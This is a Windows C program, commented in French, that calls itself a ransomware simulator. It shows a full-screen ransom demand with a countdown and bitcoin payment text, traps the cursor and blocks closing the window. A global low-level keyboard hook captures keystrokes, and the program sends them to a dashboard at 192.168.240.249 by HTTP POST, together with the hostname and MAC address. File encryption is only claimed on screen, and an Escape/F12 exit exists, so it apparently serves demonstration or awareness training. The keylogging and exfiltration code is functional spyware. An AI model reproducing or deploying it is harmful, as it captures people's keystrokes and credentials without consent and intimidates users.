#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <wininet.h>
#include <winsock2.h>
#include <math.h>
#include <ctype.h>
#include <ws2tcpip.h>
#include <rpc.h>
#include <iphlpapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "iphlpapi.lib")

#define ESCAPE_KEY VK_ESCAPE
#define ALT_ESCAPE_KEY VK_F12
#define IDT_TIMER1 1
#define LOG_BUFFER_SIZE 4096
#define DASHBOARD_URL "http://192.168.240.249:3001/api/data"
#define MACHINE_ID "VICTIM-001"

// Constantes pour l'animation
#define SKULL_ANIMATION_FRAMES 4
#define SKULL_ANIMATION_SPEED 400 // ms

// Structure globale
HFONT hFontBig, hFontSmall, hFontMono, hFontUltra;
HBITMAP hBitmap;
int countdown_seconds = 3600; // 1h
int flashState = 0;
int skullFrame = 0;
COLORREF backgroundColor = RGB(255, 0, 0);
char logBuffer[LOG_BUFFER_SIZE] = "";
HWND hwndMain = NULL;
BOOL networkConnected = FALSE;
BOOL alarmPlayed = FALSE;

// Caractères ASCII pour l'animation de crâne
const char* skullAnimation[SKULL_ANIMATION_FRAMES] = {
    "       .-\"\"\"\"-.       \n"
    "      /        \\      \n"
    "     |  O    O  |     \n"
    "     |    __    |     \n"
    "      \\  `--'  /      \n"
    "       '------'       \n",

    "       .-\"\"\"\"-.       \n"
    "      /        \\      \n"
    "     |  X    X  |     \n"
    "     |    __    |     \n"
    "      \\  `--'  /      \n"
    "       '------'       \n",

    "       .-\"\"\"\"-.       \n"
    "      /        \\      \n"
    "     |  O    O  |     \n"
    "     |   /__\\   |     \n"
    "      \\  \\__/  /      \n"
    "       '------'       \n",

    "       .-\"\"\"\"-.       \n"
    "      /        \\      \n"
    "     |  X    X  |     \n"
    "     |   /__\\   |     \n"
    "      \\  \\__/  /      \n"
    "       '------'       \n"
};

// Fonction pour obtenir l'adresse MAC
BOOL get_mac_address(char* macAddress, size_t size) {
    ULONG bufferSize = 0;
    DWORD result = GetAdaptersInfo(NULL, &bufferSize);
    
    if (result != ERROR_BUFFER_OVERFLOW) {
        return FALSE;
    }
    
    PIP_ADAPTER_INFO adapterInfo = (PIP_ADAPTER_INFO)malloc(bufferSize);
    if (!adapterInfo) {
        return FALSE;
    }
    
    result = GetAdaptersInfo(adapterInfo, &bufferSize);
    if (result == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        while (adapter) {
            // Prendre le premier adapteur qui n'est pas loopback
            if (adapter->Type != MIB_IF_TYPE_LOOPBACK && adapter->AddressLength == 6) {
                snprintf(macAddress, size, "%02X:%02X:%02X:%02X:%02X:%02X",
                        adapter->Address[0], adapter->Address[1], adapter->Address[2],
                        adapter->Address[3], adapter->Address[4], adapter->Address[5]);
                free(adapterInfo);
                return TRUE;
            }
            adapter = adapter->Next;
        }
    }
    
    free(adapterInfo);
    return FALSE;
}

// Fonction pour obtenir l'IP publique (simulée)
void get_public_ip(char* ipAddress, size_t size) {
    // Pour cette simulation, on utilise une IP française fictive
    strncpy(ipAddress, "193.168.5.77", size - 1);
    ipAddress[size - 1] = '\0';
}

// Fonction pour créer le JSON avec les données système
void create_json_data(char* jsonBuffer, size_t bufferSize, const char* keystrokesArray) {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = "UNKNOWN";
    DWORD hostnameSize = sizeof(hostname);
    GetComputerName(hostname, &hostnameSize);
    
    char macAddress[18] = "00:00:00:00:00:00";
    get_mac_address(macAddress, sizeof(macAddress));
    
    char publicIP[16];
    get_public_ip(publicIP, sizeof(publicIP));
    
    // Créer le timestamp au format ISO 8601
    time_t now = time(NULL);
    struct tm* utc_tm = gmtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%SZ", utc_tm);
    
    // Construire le JSON
    snprintf(jsonBuffer, bufferSize,
        "{\n"
        "  \"ip\": \"%s\",\n"
        "  \"hostname\": \"%s\",\n"
        "  \"country\": \"France\",\n"
        "  \"mac\": \"%s\",\n"
        "  \"timestamp\": \"%s\",\n"
        "  \"keystrokes\": %s\n"
        "}",
        publicIP, hostname, macAddress, timestamp, keystrokesArray
    );
}

// Fonction d'envoi vers le dashboard améliorée
BOOL send_to_dashboard(const char* keystrokesArray) {
    char jsonData[4096];
    create_json_data(jsonData, sizeof(jsonData), keystrokesArray);
    
    // Écrire le JSON dans un fichier local pour debug
    FILE* jsonFile = fopen("dashboard_data.json", "w");
    if (jsonFile) {
        fprintf(jsonFile, "%s", jsonData);
        fclose(jsonFile);
    }
    
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL success = FALSE;
    
    // Initialiser WinINet
    hSession = InternetOpen("RansomSim/1.0", 
                           INTERNET_OPEN_TYPE_PRECONFIG, 
                           NULL, NULL, 0);
    if (!hSession) {
        printf("Erreur InternetOpen: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Se connecter au serveur
    hConnect = InternetConnect(hSession, 
                              "192.168.240.249", 
                              3001, // Port
                              NULL, NULL, 
                              INTERNET_SERVICE_HTTP, 
                              0, 0);
    if (!hConnect) {
        printf("Erreur InternetConnect: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Créer la requête HTTP
    hRequest = HttpOpenRequest(hConnect, 
                              "POST", 
                              "/api/data", 
                              NULL, NULL, NULL, 
                              INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 
                              0);
    if (!hRequest) {
        printf("Erreur HttpOpenRequest: %lu\n", GetLastError());
        goto cleanup;
    }
    
    // Headers HTTP
    const char* headers = "Content-Type: application/json\r\n"
                         "User-Agent: RansomSim/1.0\r\n"
                         "Accept: */*\r\n";
    
    // Envoyer la requête
    success = HttpSendRequest(hRequest, 
                             headers, 
                             strlen(headers), 
                             jsonData, 
                             strlen(jsonData));
    
    if (success) {
        // Lire la réponse du serveur (optionnel)
        DWORD statusCode = 0;
        DWORD statusCodeSize = sizeof(statusCode);
        if (HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                         &statusCode, &statusCodeSize, NULL)) {
            printf("Réponse serveur: %lu\n", statusCode);
            if (statusCode == 200 || statusCode == 201) {
                success = TRUE;
            } else {
                success = FALSE;
            }
        }
    } else {
        printf("Erreur HttpSendRequest: %lu\n", GetLastError());
    }

cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hSession) InternetCloseHandle(hSession);
    
    return success;
}

// Logger les actions et statuts
void log_action(const char* format, ...) {
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    
    // Ajouter un timestamp
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S] ", localtime(&now));
    
    // Ajouter au buffer
    char temp[LOG_BUFFER_SIZE];
    snprintf(temp, sizeof(temp), "%s%s\n%s", timestamp, buffer, logBuffer);
    strncpy(logBuffer, temp, LOG_BUFFER_SIZE - 1);
    
    // Tronquer le buffer si nécessaire
    logBuffer[LOG_BUFFER_SIZE - 1] = '\0';
    
    // Enregistrer dans un fichier local
    FILE* logFile = fopen("ransomware_logs.txt", "a");
    if (logFile) {
        fprintf(logFile, "%s%s\n", timestamp, buffer);
        fclose(logFile);
    }
}

// Jouer un son d'alarme
void play_alarm_sound() {
    if (!alarmPlayed) {
        // Jouer un son d'alerte système - utiliser un bip système si le son WAV n'est pas disponible
        if (!PlaySound("alarm.wav", NULL, SND_FILENAME | SND_ASYNC)) {
            // Si le fichier n'existe pas, jouer un son système
            MessageBeep(MB_ICONERROR);
        }
        alarmPlayed = TRUE;
    }
}

// Collecter les informations système
void collect_system_info() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerName(computerName, &size);
    
    char userName[256];
    DWORD userSize = sizeof(userName);
    GetUserName(userName, &userSize);
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    log_action("Système infecté: %s (Utilisateur: %s)", computerName, userName);
    log_action("Processeurs: %d, RAM: %.2f GB", 
              sysInfo.dwNumberOfProcessors, 
              (float)memInfo.ullTotalPhys / (1024 * 1024 * 1024));
    
    // Collecter la liste des processus actifs (simulé)
    log_action("Processus actifs: explorer.exe, chrome.exe, outlook.exe, word.exe");
    
    // Envoyer les données initiales au dashboard
    char initialKeystrokes[] = "[]";
    if (send_to_dashboard(initialKeystrokes)) {
        log_action("Données initiales envoyées au dashboard avec succès");
    } else {
        log_action("Échec de l'envoi des données initiales au dashboard");
    }
}

// Convertir le code de touche en nom lisible
const char* get_key_name(DWORD vkCode) {
    static char keyName[32];
    
    // Quelques touches spéciales
    switch (vkCode) {
        case VK_RETURN: return "enter";
        case VK_ESCAPE: return "escape";
        case VK_TAB: return "tab";
        case VK_SPACE: return "space";
        case VK_BACK: return "backspace";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "shift";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "ctrl";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "alt";
        case VK_LWIN: case VK_RWIN: return "win";
        case VK_F1: return "f1";
        case VK_F2: return "f2";
        case VK_F3: return "f3";
        case VK_F4: return "f4";
        case VK_F5: return "f5";
        case VK_F6: return "f6";
        case VK_F7: return "f7";
        case VK_F8: return "f8";
        case VK_F9: return "f9";
        case VK_F10: return "f10";
        case VK_F11: return "f11";
        case VK_F12: return "f12";
    }
    
    // Pour les touches alphanumériques
    if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
        keyName[0] = (char)tolower(vkCode);
        keyName[1] = '\0';
        return keyName;
    }
    
    // Pour les autres touches, retourner le code
    sprintf(keyName, "key_0x%02X", vkCode);
    return keyName;
}

// Tableau global pour stocker les dernières frappes
#define MAX_KEYSTROKES 10
char lastKeystrokes[MAX_KEYSTROKES][32];
int keystrokeCount = 0;

// Monitorer les actions clavier
LRESULT CALLBACK keyboard_hook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        // Ignorer les touches d'échappement pour le monitoring
        if (kbStruct->vkCode != ESCAPE_KEY && kbStruct->vkCode != ALT_ESCAPE_KEY) {
            const char* keyName = get_key_name(kbStruct->vkCode);
            
            // Enregistrer l'action utilisateur dans le log
            log_action("Touche pressée: %s", keyName);
            
            // Stocker la frappe dans le tableau circulaire
            strncpy(lastKeystrokes[keystrokeCount % MAX_KEYSTROKES], keyName, 31);
            lastKeystrokes[keystrokeCount % MAX_KEYSTROKES][31] = '\0';
            keystrokeCount++;
            
            // Après avoir accumulé quelques frappes, les envoyer au dashboard
            if (keystrokeCount % 5 == 0) {
                // Construire le tableau de frappes pour le JSON (format simplifié)
                char keystrokesJson[1024] = "[";
                for (int i = 0; i < min(MAX_KEYSTROKES, keystrokeCount); i++) {
                    char temp[64];
                    int idx = (keystrokeCount - min(MAX_KEYSTROKES, keystrokeCount) + i) % MAX_KEYSTROKES;
                    
                    sprintf(temp, "\"%s\"%s", 
                           lastKeystrokes[idx], 
                           (i < min(MAX_KEYSTROKES, keystrokeCount) - 1) ? ", " : "");
                    strcat(keystrokesJson, temp);
                }
                strcat(keystrokesJson, "]");
                
                // Envoyer au dashboard
                if (send_to_dashboard(keystrokesJson)) {
                    log_action("Frappes envoyées au dashboard avec succès");
                } else {
                    log_action("Échec de l'envoi des frappes au dashboard");
                }
            }
        }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Procédure principale de la fenêtre
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static int colorStep = 0;
    static HHOOK keyboardHook = NULL;
    static DWORD skullAnimationTimer = 0;

    switch (msg) {
        case WM_CREATE:
            // Initialisation
            SetTimer(hwnd, IDT_TIMER1, 500, NULL);
            
            // Créer les polices
            hFontBig = CreateFont(80, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE, ANSI_CHARSET,
                                  OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                  ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, "Impact");

            hFontSmall = CreateFont(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET,
                                    OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");

            hFontMono = CreateFont(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, ANSI_CHARSET,
                                   OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                   ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_MODERN, "Consolas");
                                   
            hFontUltra = CreateFont(120, 0, 0, 0, FW_HEAVY, TRUE, FALSE, FALSE, ANSI_CHARSET,
                                  OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                  ANTIALIASED_QUALITY, DEFAULT_PITCH | FF_SWISS, "Impact");
            
            // Charger le QR code pour le paiement simulé
            hBitmap = (HBITMAP)LoadImage(NULL, "qr.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
            if (!hBitmap) {
                log_action("Impossible de charger qr.bmp");
            }
            
            // Installer le hook clavier
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
            
            // Collecter les informations système
            collect_system_info();
            
            // Initialiser le timer d'animation
            skullAnimationTimer = GetTickCount();
            
            // Jouer un son d'alarme
            play_alarm_sound();
            
            log_action("Ransomware active - Début du decompte: %d secondes", countdown_seconds);
            break;

        case WM_TIMER:
            // Animation de clignotement
            flashState = !flashState;
            colorStep = (colorStep + 15) % 255;
            
            // Animation du crâne
            if (GetTickCount() - skullAnimationTimer > SKULL_ANIMATION_SPEED) {
                skullFrame = (skullFrame + 1) % SKULL_ANIMATION_FRAMES;
                skullAnimationTimer = GetTickCount();
            }
            
            static int frameCount = 0;
            frameCount++;
            
            // Gestion du compte à rebours
            if (countdown_seconds > 0) {
                countdown_seconds--;
                
                // Loguer à des moments clés
                if (countdown_seconds % 600 == 0) { // Toutes les 10 minutes
                    log_action("Temps restant: %02d:%02d:%02d", 
                              countdown_seconds / 3600, 
                              (countdown_seconds % 3600) / 60, 
                              countdown_seconds % 60);
                }
            }
            
            // Animation de la couleur de fond
            int red = 255;
            int blue = abs(sin(frameCount * 0.05) * 50);
            backgroundColor = RGB(red, 0, blue);
            
            // Rejouer le son d'alarme périodiquement
            if (frameCount % 100 == 0) {
                alarmPlayed = FALSE;
                play_alarm_sound();
            }
            
            // Vérifier si l'utilisateur tente de s'échapper (Echap ou F12)
            if ((GetAsyncKeyState(ESCAPE_KEY) & 0x8000) || (GetAsyncKeyState(ALT_ESCAPE_KEY) & 0x8000)) {
                log_action("L'utilisateur a utilise une touche d'echappement");
                ClipCursor(NULL);
                if (keyboardHook) {
                    UnhookWindowsHookEx(keyboardHook);
                }
                PostQuitMessage(0);
            }

            InvalidateRect(hwnd, NULL, TRUE);
            break;

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rect;
            GetClientRect(hwnd, &rect);
            
            // Dessiner le fond
            HBRUSH hBrush = CreateSolidBrush(backgroundColor);
            FillRect(hdc, &ps.rcPaint, hBrush);
            DeleteObject(hBrush);
            
            // Effet de scan-line (lignes horizontales semi-transparentes)
            for (int y = 0; y < rect.bottom; y += 3) {
                RECT scanLine = {rect.left, y, rect.right, y + 1};
                HBRUSH scanBrush = CreateSolidBrush(RGB(0, 0, 0));
                FillRect(hdc, &scanLine, scanBrush);
                DeleteObject(scanBrush);
            }
            
            // Couleur d'alerte clignotante
            COLORREF alertColor = flashState ? RGB(255, 255, 0) : RGB(255, 0, 0);
            
            // TITRE EN ÉNORME
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, hFontUltra);
            SetTextColor(hdc, alertColor);
            RECT titleRect = rect;
            titleRect.top += 40;
            DrawText(hdc, "RANSOMWARE", -1, &titleRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            
            // Message principal
            SelectObject(hdc, hFontBig);
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT mainRect = rect;
            mainRect.top += 160;
            DrawText(hdc, "VOS FICHIERS SONT CHIFFRES", -1, &mainRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            
            // Afficher le crâne ASCII
            SelectObject(hdc, hFontMono);
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT skullRect = {rect.left + rect.right/2 - 200, rect.top + 250, rect.left + rect.right/2 + 200, rect.top + 450};
            DrawText(hdc, skullAnimation[skullFrame], -1, &skullRect, DT_CENTER | DT_TOP);
            
            // Afficher le compteur avec un formatage dramatique
            char buffer[64];
            sprintf(buffer, "TEMPS RESTANT: %02d:%02d:%02d", 
                   countdown_seconds / 3600, 
                   (countdown_seconds % 3600) / 60, 
                   countdown_seconds % 60);
            
            SelectObject(hdc, hFontSmall);
            SetTextColor(hdc, flashState ? RGB(255, 255, 255) : RGB(255, 255, 0));
            RECT timerRect = rect;
            timerRect.top += 450;
            DrawText(hdc, buffer, -1, &timerRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            
            // Message de menace
            SetTextColor(hdc, RGB(255, 255, 255));
            RECT threatRect = rect;
            threatRect.top += 500;
            DrawText(hdc, "ENVOYEZ 0.1 BITCOIN A L'ADRESSE CI-DESSOUS", -1, &threatRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            
            RECT warningRect = rect;
            warningRect.top += 540;
            DrawText(hdc, "OU TOUS VOS FICHIERS SERONT DETRUITS", -1, &warningRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            
            // Afficher le QR code pour le paiement
            if (hBitmap) {
                HDC hdcMem = CreateCompatibleDC(hdc);
                HGDIOBJ oldBitmap = SelectObject(hdcMem, hBitmap);
                BITMAP bmp;
                GetObject(hBitmap, sizeof(bmp), &bmp);
                int x = (rect.right - bmp.bmWidth) / 2;
                int y = rect.top + 600;
                BitBlt(hdc, x, y, bmp.bmWidth, bmp.bmHeight, hdcMem, 0, 0, SRCCOPY);
                DeleteDC(hdcMem);
            }
            
            // Informations pour quitter le simulateur (utile pour les tests)
            #ifdef _DEBUG
            SetTextColor(hdc, RGB(150, 150, 150));
            SelectObject(hdc, hFontSmall);
            RECT infoRect = rect;
            infoRect.top = rect.bottom - 50;
            DrawText(hdc, "Simulateur - Appuyez sur Echap ou F12 pour quitter", -1, &infoRect, DT_CENTER | DT_TOP | DT_SINGLELINE);
            #endif
            
            // Afficher le log pour le debug (visible uniquement en mode debug)
            #ifdef _DEBUG
            SetTextColor(hdc, RGB(200, 200, 200));
            SelectObject(hdc, hFontMono);
            RECT logRect = {20, rect.bottom - 200, rect.right - 20, rect.bottom - 70};
            DrawText(hdc, logBuffer, -1, &logRect, DT_LEFT | DT_TOP | DT_WORDBREAK);
            #endif

            EndPaint(hwnd, &ps);
        }
        return 0;

        case WM_MOUSEMOVE:
            // Loguer les mouvements de souris occasionnellement
            if (rand() % 20 == 0) {
                log_action("Mouvement souris: %d, %d", LOWORD(lParam), HIWORD(lParam));
            }
            return 0;
            
        case WM_LBUTTONDOWN:
            log_action("Clic gauche: %d, %d", LOWORD(lParam), HIWORD(lParam));
            return 0;
            
        case WM_RBUTTONDOWN:
            log_action("Clic droit: %d, %d", LOWORD(lParam), HIWORD(lParam));
            return 0;

        case WM_CLOSE:
            log_action("Tentative de fermeture de la fenetre");
            return 0; // Bloquer la fermeture normale
            
        case WM_DESTROY:
            if (keyboardHook) {
                UnhookWindowsHookEx(keyboardHook);
            }
            log_action("Simulation terminée");
            return 0;
    }

    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// Point d'entrée principal
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    const char CLASS_NAME[] = "RansomSimXOR";

    WNDCLASS wc = { };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    RegisterClass(&wc);

    // Créer la fenêtre en plein écran et en premier plan
    hwndMain = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME,
        "Ransomware Simulator",
        WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL
    );

    if (hwndMain == NULL) {
        return 0;
    }

    ShowWindow(hwndMain, SW_SHOW);
    SetForegroundWindow(hwndMain);
    SetFocus(hwndMain);
    
    // Restreindre le curseur à la fenêtre
    RECT rect;
    GetWindowRect(hwndMain, &rect);
    ClipCursor(&rect);

    // Boucle de messages
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyage
    ClipCursor(NULL);
    DeleteObject(hBitmap);
    DeleteObject(hFontBig);
    DeleteObject(hFontSmall);
    DeleteObject(hFontMono);
    DeleteObject(hFontUltra);
    return 0;
}